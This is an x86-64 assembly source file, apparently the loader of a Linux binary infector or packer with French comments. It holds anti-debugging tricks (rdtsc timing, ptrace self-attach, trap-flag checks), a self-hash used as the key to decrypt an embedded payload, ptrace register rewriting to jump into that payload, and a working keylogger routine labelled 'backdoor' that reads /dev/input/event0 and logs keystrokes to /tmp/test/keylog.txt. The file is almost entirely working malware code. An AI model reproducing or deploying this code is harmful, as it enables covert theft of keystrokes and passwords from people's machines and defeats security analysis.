default rel
global ft_end
global syscalls

;r14 pid child dans parent et ppid dans child

syscalls:
	rdtsc
	mov r12, rax
	rdtsc
	sub rax, r12
	cmp rax, 0xff
	jg end_ft_end

fork_check:
	xor rax, rax
	mov rax, 0x39
	syscall	;fork
	mov r14, rax
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	cmp rax, 0
	je child_check
	jl end_ft_end
	sub rsp, 0x20 ;status
	call wait4_for_parent ;wait child_check
	mov rax, [rbp - 0x20]
	add rsp, 0x20
	and rax, 0xff00
	shr rax, 8
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	cmp rax, 1	;check if ok with WEXITSTATUS
	je end_ft_end

fork_hash:
	xor rax, rax
	mov rax, 0x39
	syscall	;fork
	mov r14, rax
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	cmp rax, 0
	je child_hash
	jl end_ft_end

wait_loop:
	jmp wait_loop

child_check:
	call getppid
	mov r14, rax
	mov rdi, 0x10
	mov r10, 0
	call ptrace ;PTRACE_ATTACH
	cmp rax, 0
	jl exit_1
	call wait4_for_child ;wait for attach
	mov rdi, 0x11
	mov r10, 0
	call ptrace ;PTRACE_DETACH
	jmp exit_0

hash:
	;    mov edi, 5381 ;hash
	mov edi, r13d ; r13 got result of hash loader
	;    mov r13d, edi ;hash bis
	mov rdx, 0x44d ;size payload + bis_size a modifier 0x1f4f
	mov rsi, 0 ;inc
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	lea rcx, [syscalls] ;adresse syscalls
hash_loop1:
	cmp rsi,0x11f;|REPLACE3| offset key a eviter
	jl after_cmp
	cmp rsi,0x123;|REPLACE4| offset key a eviter
	jle hash_loop2
after_cmp:
	shl edi, 5
	add edi, r13d
	xor r13, r13
	mov r13b, byte [rcx]
	add edi, r13d
	mov r13d, edi
hash_loop2:
	inc rsi
	inc rcx
	cmp rsi, rdx
	jl hash_loop1
	jmp child_hash2
	jmp after_exit_5
jmp5:
	jmp -1 ; sortie
after_exit_5:
	;	cmp eax, 0 ; syscalls
	;	jg end_ft_end ; jg FOR DEBUG, jl FOR TRUE, je FOR REVERSE ; syscalls
	jmp after_exit_2
jmp2:
	jmp -1 ; sortie
after_exit_2:
;
chiffrement:
	mov r15d, -1 ; CLE DE CHIFFREMENT ; chiffrement
	add r15d, r13d
	mov r9, 8 ; NB_TIMING MOODULABLE ; chiffrement
	mov r14, 0x95837523 ; SUB ; chiffrement
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	pushfq ; verif step by step
	pop r12
	mov r13, 1 ; mark this zone as loader ; chiffrement
chiffrement_loop2:
	jmp dechiffrement_loop2 ; going to save size and pos of encryption zone ; chiffrement
chiffrement_loop2_a:
	add rdi, rcx ; aller a la fin du payload ; chiffrement
	sub rdi, 4 ; chiffrement
	add r15, r14 ; chiffrement
	std ; chiffrement
	jmp chiffrement_loop1
dechiffrement_loop1:
	mov eax, DWORD [rdi] ; dechiffrement
	xor rax, r15 ; dechiffrement
	jmp label_a
label_1:
	stosd ; chiffrement
	jmp label_b
label_2:
	sub ecx, 4 ; chiffrement
	cmp ecx, 0 ; chiffrement
	jmp label_c
label_3:
	jg chiffrement_loop1 ; chiffrement
chiffrement_loop1_a:
	dec r9 ; chiffrement & dechiffrement
	test r9, r9 ; chiffrement & dechiffrement
	jne chiffrement_loop2 ; chiffrement & dechiffrement
	cmp r12, 0x100; verif step by step
	je end_ft_end
	cmp r13, 2 ; chiffrement & dechiffrement
	je end_ft_end ; chiffrement & dechiffrement
	sub r15d, 0x12345678; To patch, fingerprint
	lea r13, [ft_end]
	add r15, r13

	mov rdi, r15
	mov rsi, 0x2
	mov rax, 0x2
	syscall
	jc wait_loop
	jmp -0x1265

label_jmp_to_payload:
	jmp r15 ; addresse du payload ; jmp_to_payload
ft_end:
	mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	mov r13, 2 ; mark this zone as end ; dechiffrement
dechiffrement_loop2:
	mov eax, 0x50a0;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
	shr eax, 2 ; dechiffrement & chiffrement
	jmp after_exit_3
	jmp after_exit_4
jmp4:
	jmp -1 ; sortie
after_exit_4:
	;
jmp3:
	jmp -1 ; sortie
after_exit_3:
	shl eax, 2 ; dechiffrement & chiffrement
	mov ecx, eax ; dechiffrement & chiffrement
	sub ecx, DWORD 4 ; dechiffrement & chiffrement
	mov rdi, rbx ; debut du payload ; dechiffrement & chiffrement
	cmp r13, 1 ; cmp to get back in loader if necessary ; dechiffrement & chiffrement
	je chiffrement_loop2_a ; dechiffrement & chiffrement
	sub r15, r14 ; dechiffrement
	cld ; dechiffrement
	jmp dechiffrement_loop1
chiffrement_loop1:
	sub r15d, 0x62F98A47 ; chiffrement
	and r12, 0x100 ; verif step by step
	mov eax, DWORD [rdi] ; chiffrement
	xor rax, r15 ; chiffrement
	jmp label_1
label_a:
	stosd ; dechiffrement
	add r15d, DWORD [rdi - 4] ; dechiffrement
	jmp label_2
label_b:
	sub ecx, 4 ; dechiffrement
	cmp ecx, 0 ; dechiffrement
	jmp label_3
label_c:
	jg dechiffrement_loop1 ; dechiffrement
	jmp chiffrement_loop1_a ; dechiffrement
end_ft_end:
	pop r15 ; pop
	pop r14 ; pop
	pop r13 ; pop
	pop r12 ; pop
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	pop r11 ; pop
	pop r10 ; pop
	pop r9 ; pop
	pop r8 ; pop
	pop rdx ; pop
	pop rcx ; pop
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	pop rbx ; pop
	pop rax ; pop
	pop rsi ; pop
	pop rdi ; pop
	mov rsp, rbp ; pop
	pop rbp ; pop
	add rsp, 8 ; pop
	cmp DWORD [rsp - 8], 5 ; sortie
	je jmp1 ; sortie
	cmp DWORD [rsp - 8], 4 ; sortie
	je jmp2 ; sortie
	cmp DWORD [rsp - 8], 3 ; sortie
	jmp after_exit_1
jmp1:
	jmp -1 ; sortie
after_exit_1:
	je jmp3 ; sortie
	cmp DWORD [rsp - 8], 2 ; sortie
	je jmp4 ; sortie
	cmp DWORD [rsp - 8], 1 ; sortie
	je jmp5 ; sortie

getppid:
	mov rax, 0x6e ;getppid
	syscall
	ret

wait4_for_parent:
	mov rdi, r14
	lea rsi, [rbp - 0x20]
	mov rdx, 0x2
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	mov r10, 0
	mov rax, 0x3d
	syscall
	ret

wait4_for_child:
	mov rdi, r14
	mov rsi, 0
	mov rdx, 0
	mov r10, 0
	mov rax, 0x3d
	syscall
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	ret

ptrace:
	mov rsi, r14
	mov rdx, 0
	mov rax, 0x65
	syscall
	ret

print_exit1:
	db "exit1"
print_exit0:
	db "exit0"

exit_1:	
;	mov rdi, 1
;	lea rsi, [print_exit1]
;	mov rdx, 5
;	mov rax, 1
;	syscall

	mov rax, 0x3c
	mov rdi, 0x1
	syscall

exit_0:	
;	mov rdi, 1
;	lea rsi, [print_exit0]
;	mov rdx, 5
;	mov rax, 1
;	syscall

	mov rax, 0x3c
	mov rdi, 0x0
	syscall


write_path1 db  "/dev/input/event0", 0

;write_path1:
;	mov [rsp], DWORD 0x7665642f
;	mov [rsp + 0x4], DWORD 0x706e692f
;	mov [rsp + 0x8], DWORD 0x652f7475
;	mov [rsp + 0xc], DWORD 0x746e6576
;	mov [rsp + 0x10], DWORD 0x00000030
;	ret

write_path2 db "/tmp/test/keylog.txt", 0
;	mov [rsp], DWORD 0x706d742f
;	mov [rsp + 0x4], DWORD 0x7365742f
;	mov [rsp + 0x8], DWORD 0x656b2f74
;	mov [rsp + 0xc], DWORD 0x676f6c79
;	mov [rsp + 0x10], DWORD 0x2e726567
;	mov [rsp + 0x14], DWORD 0x00747874
;	ret

backdoor:
	sub rsp, 0x20
	lea rdi, [write_path1]
	xor rsi, rsi
	mov rdx, 0
	mov rax, 0x2 ; OPEN SYSCALL
	syscall
	cmp rax, 0
	jl exit_1

	mov DWORD [rbp - 0x20], eax

	lea rdi, [write_path2]
	mov rsi, 0x41
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	mov rdx, 666o
	mov rax, 0x2
	syscall

;	mov rdi, 1
;	lea rsi, [print_exit0]
;	mov rdx, 5
;	mov rax, 1
;	syscall

	cmp rax, 0
	jl exit_1
	mov DWORD [rbp - 0x1c], eax

loop_keylogger:
	mov edi, DWORD [rbp - 0x20]
	lea rsi, [rbp - 0x18]
	mov rdx, 0x18 ;size of struct input_event
	xor rax, rax
	syscall ;read
	
	cmp [rbp - 0x8], WORD 0x1 ;event type is EV_KEY
	jne loop_keylogger
	cmp [rbp - 0x4], DWORD 0x1 ;event value
	jne loop_keylogger

	mov edi, DWORD [rbp - 0x1c]
	mov si, WORD [rbp - 0x6]
	mov rdx, 0x2
	mov rax, 0x1
	syscall ;write

	jmp loop_keylogger

child_hash:
;	xor rax, rax
;	mov rax, 0x39
;	syscall	;fork
;	mov r14, rax
;	cmp rax, 0
;	je backdoor
;	jl exit_1
	
	
	call getppid
	mov r14, rax
	sub rsp, 0x100 ; struct size = 0xd8
	mov rdi, 0x10
	mov r10, 0
	call ptrace ; PTRACE_ATTACH
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	cmp rax, 0
	jl exit_1
	call wait4_for_child
	mov rdi, 0xc
	lea r10, [rbp - 0xf0]
	call ptrace ; PTRACE_GETREGS
	jmp hash

child_hash2:
	lea rax, [chiffrement]
	mov [rbp - 0x70], rax
	mov [rbp - 0xe0], r13 ; put r13, hash of bis
	mov rdi, 0xd
	lea r10, [rbp - 0xf0]
	call ptrace ; PTRACE_SETREGS
	mov rdi, 0x18
	mov r10, 0
	call ptrace ; PTRACE_SYSCALL
	call wait4_for_child
	mov rdi, 0xc
	lea r10, [rbp - 0xf0]
	call ptrace ; PTRACE_GETREGS
	lea rax, [label_jmp_to_payload]
	mov [rbp - 0x70], rax
	mov rdi, 0xd
	lea r10, [rbp - 0xf0]
	call ptrace ; PTRACE_SETREGS
	mov rdi, 0x07
	mov r10, 0
	call ptrace ; PTRACE_CONT
	nop
	nop
	nop ; placeholder
	nop
	nop
	nop
	call wait4_for_child ; wait end parent after exit
	add rsp, 0x100
	jmp exit_0

last_instr_of_end:
	nop
